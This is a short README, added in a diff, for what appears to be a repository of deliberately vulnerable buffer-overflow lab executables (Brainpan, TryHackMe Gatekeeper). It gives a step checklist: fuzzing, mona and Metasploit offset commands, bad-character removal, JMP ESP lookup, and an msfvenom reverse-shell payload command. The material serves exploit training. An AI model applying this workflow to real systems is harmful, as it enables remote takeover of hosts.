@@ -1,0 +1,28 @@
+# bufferoverflow
+all bufferoverflow exe files 
+brainpain buffer overflow exe file 
+tryhackem gatekeeper exe file  :)
+
+==========================================
+how to solve Bufferoverflow machine 
+===========================================
+
+nc <ip> <port>
+python3 fuzzing1.py
+  !mona config-set workingfolder c:\mona\%p
+  locate pattern_create.rb  -> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+  !mona findmsp -distance 600
+python3 fuzzing2.py
+  locate pattern_offset.rb   > /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 32724131
+python3 badcharcreate.py   > create badcharters and paste the script 
+  !mona bytearray -b "\x00"
+  !mona compare -f c:\mona\oscp\bytearray.bin -a <esp address>
+  note:- remove all badcharaters 
+  !mona jmpesp -r esp -cpb "\x00"    > finding jmp esp pointer 
+  
+  finaly generate a msfvenom payload :- 
+  msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 EXITFUNC=thread -b "\x00" -f c 
+  
+  note :- add script default prepond NOPS 
+          padding= "\x90"*16
+  
